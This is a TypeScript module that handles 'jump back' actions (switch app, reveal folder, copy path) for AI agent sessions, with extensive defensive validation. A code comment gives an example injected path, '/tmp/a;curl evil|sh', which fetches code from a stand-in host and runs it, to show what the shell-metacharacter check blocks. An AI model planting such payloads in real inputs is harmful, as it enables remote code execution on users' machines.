import { execFile } from 'node:child_process'
import path from 'node:path'
import type { AgentStatusEvent } from '../src/types/agent'
import type { HostAppId } from '../src/types/host-app'
import type { SessionJumpAction, SessionJumpResult } from '../src/types/session-jump'
import { isValidBundleId, parseHostHints, resolveHostBundleId } from './host-app.ts'
import { SlidingWindowLimiter } from './sliding-window-limiter.ts'

// "Jump back" actions for one agent session: switch to its app, show its project folder or copy
// its path. The absolute project path and bundle id arrive with token-authenticated events and are
// kept here, in main-process memory only; the renderer names a session by source + session id.
//
// Trust boundary: hook events and generic /v1/events callers share one event token, and the
// adapter registry assigns a built-in adapter id from the `source` field alone, so a token holder
// can pose as a hook. Nothing here relies on the event being "really" from a hook. The guarantees
// are: only allowlisted terminal/IDE apps can ever be activated, every action needs a user click,
// and folders are only revealed (never opened, so no app or document package is launched).

const MAX_ENTRIES = 200
/** Matches the renderer's removal horizon; an older session cannot be shown, so it cannot be targeted. */
const MAX_AGE_MS = 45 * 60_000
const MAX_PATH_LENGTH = 4096
const RATE_WINDOW_MS = 10_000
const RATE_LIMIT_PER_ACTION = 5
// eslint-disable-next-line no-control-regex
const CONTROL_CHARACTERS = /[\u0000-\u001f\u007f]/
// Package directories are refused outright; the folder is only ever revealed, but there is no
// reason to point Finder at a bundle. (Document packages such as .xcodeproj are covered by the
// reveal-only behaviour, not by this list.)
const MAC_PACKAGE_EXTENSIONS: ReadonlySet<string> = new Set([
  '.app', '.appex', '.action', '.bundle', '.component', '.driver', '.framework', '.kext', '.mdimporter', '.mpkg',
  '.pkg', '.plugin', '.prefpane', '.qlgenerator', '.saver', '.systemextension', '.wdgt', '.workflow', '.xpc',
])

/** What main learned about a session from its hook events. */
export interface SessionJumpContext {
  /** Raw `project` (cwd) string from the event; validated before any use. */
  projectPath?: string
  /** Allowlisted macOS bundle id the hook reported. */
  bundleId?: string
}

interface JumpEntry {
  adapterId?: string
  app?: HostAppId
  bundleId?: string
  projectPath?: string
  lastSeenAt: number
}

export interface DirectoryStat {
  isDirectory(): boolean
}

export interface SessionJumpDependencies {
  platform: NodeJS.Platform
  now?: () => number
  getPreferences(): { sessionJumpEnabled: boolean; sessionJumpSwitchAppEnabled: boolean }
  /** Runs `/usr/bin/open -b <bundleId>`; injected so tests never launch anything. */
  activateBundle(bundleId: string): Promise<void>
  /**
   * Reveals a verified directory in the file manager (selects it in its parent). Never "opens" it:
   * LaunchServices treats document packages (.xcodeproj, .rtfd, ...) as documents and would launch
   * their app with attacker-chosen content.
   */
  revealDirectory(directory: string): void
  writeClipboard(text: string): void
  realpath(target: string): Promise<string>
  stat(target: string): Promise<DirectoryStat>
  /** True when the path exists (used to recognise bundles by their Contents/Info.plist). */
  exists(target: string): Promise<boolean>
}

const OPEN_TIMEOUT_MS = 5_000
const OPEN_EXECUTABLE = '/usr/bin/open'

export type ExecFileLike = (
  file: string,
  args: ReadonlyArray<string>,
  options: { timeout: number; shell: false },
  callback: (error: Error | null) => void,
) => unknown

/**
 * Brings an app forward through LaunchServices (`open -b <bundle id>`): a fixed executable, an
 * argument array and no shell. It sends no Apple Event, so it needs no Automation or
 * Accessibility permission and raises no system prompt. It activates the app (launching it if it
 * is not running) but cannot choose a specific window or tab.
 */
export function activateMacBundle(bundleId: string, run: ExecFileLike = execFile as unknown as ExecFileLike): Promise<void> {
  if (!isValidBundleId(bundleId)) return Promise.reject(new Error('invalid bundle id'))
  return new Promise((resolve, reject) => {
    run(OPEN_EXECUTABLE, ['-b', bundleId], { timeout: OPEN_TIMEOUT_MS, shell: false }, error => {
      if (error) reject(error)
      else resolve()
    })
  })
}

export function sessionJumpKey(source: string, sessionId: string): string {
  return `${source}:${sessionId}`
}

function pathApi(platform: NodeJS.Platform): path.PlatformPath {
  return platform === 'win32' ? path.win32 : path.posix
}

/** A path string we are willing to put on the clipboard or resolve: absolute, bounded, no control characters. */
export function isUsableProjectPath(value: unknown, platform: NodeJS.Platform): value is string {
  if (typeof value !== 'string' || value.length === 0 || value.length > MAX_PATH_LENGTH) return false
  if (CONTROL_CHARACTERS.test(value)) return false
  if (!pathApi(platform).isAbsolute(value)) return false
  // UNC and device paths would make Explorer contact a remote host (and send credentials).
  if (platform === 'win32' && /^[\\/]{2}/.test(value)) return false
  return true
}

// Shell metacharacters (and quotes) that would change what an unquoted paste does. Backslash is
// an escape in POSIX shells but the separator on Windows, where cmd's % and ^ are refused instead.
const POSIX_SHELL_METACHARACTERS = /[;|&$`<>(){}*?!"'\\]/
const WINDOWS_SHELL_METACHARACTERS = /[;|&$`<>(){}*?!"'%^]/

/** A path that can be pasted unquoted into a shell without running anything extra. */
export function isShellSafePath(value: string, platform: NodeJS.Platform): boolean {
  if (CONTROL_CHARACTERS.test(value)) return false
  return !(platform === 'win32' ? WINDOWS_SHELL_METACHARACTERS : POSIX_SHELL_METACHARACTERS).test(value)
}

/** Resolves a project path to an existing, non-bundle directory, or null. Never follows into a file. */
export async function verifyProjectDirectory(
  value: unknown,
  deps: Pick<SessionJumpDependencies, 'platform' | 'realpath' | 'stat' | 'exists'>,
): Promise<string | null> {
  if (!isUsableProjectPath(value, deps.platform)) return null
  let real: string
  try {
    real = await deps.realpath(value)
  } catch {
    return null
  }
  // realpath resolved every link; check the result again (a link may point at a UNC share).
  if (!isUsableProjectPath(real, deps.platform)) return null
  try {
    if (!(await deps.stat(real)).isDirectory()) return null
  } catch {
    return null
  }
  const api = pathApi(deps.platform)
  if (deps.platform === 'darwin') {
    if (MAC_PACKAGE_EXTENSIONS.has(api.extname(real).toLowerCase())) return null
    if (await deps.exists(api.join(real, 'Contents', 'Info.plist'))) return null
  }
  // Windows shell namespace junctions ("name.{CLSID}") open a shell extension, not a folder.
  if (deps.platform === 'win32' && /\.\{[0-9a-f-]+\}$/i.test(real)) return null
  return real
}

export class SessionJumpService {
  private readonly entries = new Map<string, JumpEntry>()
  private readonly limiters = new Map<SessionJumpAction, SlidingWindowLimiter>()
  private readonly now: () => number
  private readonly deps: SessionJumpDependencies

  constructor(deps: SessionJumpDependencies) {
    this.deps = deps
    this.now = deps.now ?? Date.now
  }

  /** Called once per accepted event, after rate limiting. O(1). */
  record(event: AgentStatusEvent, context?: SessionJumpContext): void {
    if (event.originalEvent === 'AgentPetsIntegrationTest') return
    const key = sessionJumpKey(event.source, event.sessionId)
    if (event.state === 'offline') {
      this.entries.delete(key)
      return
    }
    const previous = this.entries.get(key)
    const reportedPath = context?.projectPath
    const projectPath = isUsableProjectPath(reportedPath, this.deps.platform) ? reportedPath : previous?.projectPath
    const app = event.host?.app ?? previous?.app
    const bundleId = event.host ? context?.bundleId : previous?.bundleId
    this.entries.delete(key)
    this.entries.set(key, {
      ...(event.adapterId ? { adapterId: event.adapterId } : {}),
      ...(app ? { app } : {}),
      ...(bundleId ? { bundleId } : {}),
      ...(projectPath ? { projectPath } : {}),
      lastSeenAt: this.now(),
    })
    while (this.entries.size > MAX_ENTRIES) this.entries.delete(this.entries.keys().next().value as string)
  }

  clear(): void {
    this.entries.clear()
  }

  /** Bundle id "switch to app" would activate for this session, or null. */
  switchTarget(key: string): string | null {
    if (this.deps.platform !== 'darwin') return null
    const entry = this.entry(key)
    // Defence in depth only: an explicit generic-http event is refused, but a token holder can still
    // claim a built-in source. The allowlist in resolveHostBundleId is the real boundary.
    if (!entry || !entry.adapterId || entry.adapterId === 'generic-http') return null
    return resolveHostBundleId(entry.app, entry.bundleId)
  }

  /**
   * Notification click about one session: switch to its app when that is allowed. Returns false
   * (so the caller opens the Sessions tab instead) whenever it did not switch.
   */
  async switchFromNotification(target: { source: string; sessionId: string }): Promise<boolean> {
    const key = sessionJumpKey(target.source, target.sessionId)
    if (!this.switchTarget(key)) return false
    return (await this.run('switch-app', key)).ok
  }

  async run(action: SessionJumpAction, key: string): Promise<SessionJumpResult> {
    const preferences = this.deps.getPreferences()
    if (!preferences.sessionJumpEnabled) return { ok: false, error: 'disabled' }
    if (action === 'switch-app' && !preferences.sessionJumpSwitchAppEnabled) return { ok: false, error: 'disabled' }
    if (!this.take(action)) return { ok: false, error: 'rate_limited' }
    const entry = this.entry(key)
    if (!entry) return { ok: false, error: 'unknown_session' }

    switch (action) {
      case 'switch-app': {
        if (this.deps.platform !== 'darwin') return { ok: false, error: 'unsupported' }
        const bundleId = this.switchTarget(key)
        if (!bundleId) return { ok: false, error: 'unavailable' }
        try {
          await this.deps.activateBundle(bundleId)
          return { ok: true }
        } catch {
          return { ok: false, error: 'failed' }
        }
      }
      case 'show-folder': {
        const directory = await verifyProjectDirectory(entry.projectPath, this.deps)
        if (!directory) return { ok: false, error: 'unavailable' }
        try {
          this.deps.revealDirectory(directory)
          return { ok: true }
        } catch {
          return { ok: false, error: 'failed' }
        }
      }
      case 'copy-path': {
        // The user pastes this without seeing it, often into a shell. Only a path free of shell
        // metacharacters that is an existing, non-bundle directory right now reaches the clipboard,
        // so a forged event cannot plant `/tmp/a;curl evil|sh`. Copied as reported, not resolved.
        const projectPath = entry.projectPath
        if (!projectPath || !isShellSafePath(projectPath, this.deps.platform)) return { ok: false, error: 'unavailable' }
        if (!(await verifyProjectDirectory(projectPath, this.deps))) return { ok: false, error: 'unavailable' }
        try {
          this.deps.writeClipboard(projectPath)
          return { ok: true }
        } catch {
          return { ok: false, error: 'failed' }
        }
      }
    }
  }

  private entry(key: string): JumpEntry | undefined {
    const entry = this.entries.get(key)
    if (!entry) return undefined
    if (this.now() - entry.lastSeenAt > MAX_AGE_MS) {
      this.entries.delete(key)
      return undefined
    }
    return entry
  }

  private take(action: SessionJumpAction): boolean {
    let limiter = this.limiters.get(action)
    if (!limiter) {
      limiter = new SlidingWindowLimiter(RATE_WINDOW_MS, RATE_LIMIT_PER_ACTION)
      this.limiters.set(action, limiter)
    }
    return limiter.consume(this.now(), RATE_LIMIT_PER_ACTION).allowed
  }
}

// Raw ingress facts for an accepted event, keyed by the event object the event server later hands
// to onEvent. A WeakMap never reaches a renderer (IPC clones the event's own fields only).
const contexts = new WeakMap<AgentStatusEvent, SessionJumpContext>()

function rawField(input: unknown, key: string): unknown {
  return input && typeof input === 'object' && !Array.isArray(input) ? (input as Record<string, unknown>)[key] : undefined
}

/**
 * Adds the main-process `switchable` verdict to the event's host and remembers the raw project
 * path and allowlisted bundle id for the jump service. Returns the event to dispatch.
 */
export function withSessionJumpContext(
  input: unknown,
  event: AgentStatusEvent,
  platform: NodeJS.Platform = process.platform,
): AgentStatusEvent {
  const bundleId = event.host ? parseHostHints(rawField(input, 'host'))?.bundleId : undefined
  const projectPath = rawField(input, 'project')
  const next = event.host
    ? {
        ...event,
        host: {
          kind: event.host.kind,
          app: event.host.app,
          switchable: platform === 'darwin'
            && event.adapterId !== undefined
            && event.adapterId !== 'generic-http'
            && resolveHostBundleId(event.host.app, bundleId) !== null,
        },
      }
    : event
  contexts.set(next, {
    ...(typeof projectPath === 'string' ? { projectPath } : {}),
    ...(bundleId ? { bundleId } : {}),
  })
  return next
}

export function takeSessionJumpContext(event: AgentStatusEvent): SessionJumpContext | undefined {
  const context = contexts.get(event)
  contexts.delete(event)
  return context
}
